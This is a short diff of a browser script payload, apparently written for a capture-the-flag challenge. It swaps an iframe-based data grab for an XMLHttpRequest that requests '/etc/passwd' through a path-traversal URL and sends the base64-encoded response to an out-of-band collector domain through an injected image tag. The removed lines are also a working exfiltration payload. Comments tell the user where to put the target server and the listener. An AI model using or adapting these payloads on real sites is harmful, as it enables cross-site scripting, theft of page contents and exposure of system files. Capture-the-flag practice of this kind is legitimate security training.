@@ -1,13 +1,8 @@
 <script>
-var iframe = document.createElement("iframe");
-iframe.src = "https://heliodor.ctfio.com/blind/recipe";
-iframe.onload = function () {
-    try {
-        var data = iframe.contentDocument.body.innerText;
-        new Image().src =
-            "https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/?x=" +
-            btoa(unescape(encodeURIComponent(data)));
-    } catch (e) {}
-};
-document.body.appendChild(iframe);
+    exfil = new XMLHttpRequest();
+    // Set the correct server below e.g https://abcdefg.ctfio.com
+    exfil.open("GET","https://heliodor.ctfio.com/../../../../../../../../etc/passwd");
+    exfil.send();
+    // put your colab instance below to you can capture the contents of /blind/recipe
+    exfil.onload = function(){ document.write('<img src="https://alxahyaoyjbzqgdbnokoq6mhut6y4r2jf.oast.fun/x/?x=' + btoa(this.responseText) + '">'); }
 </script>
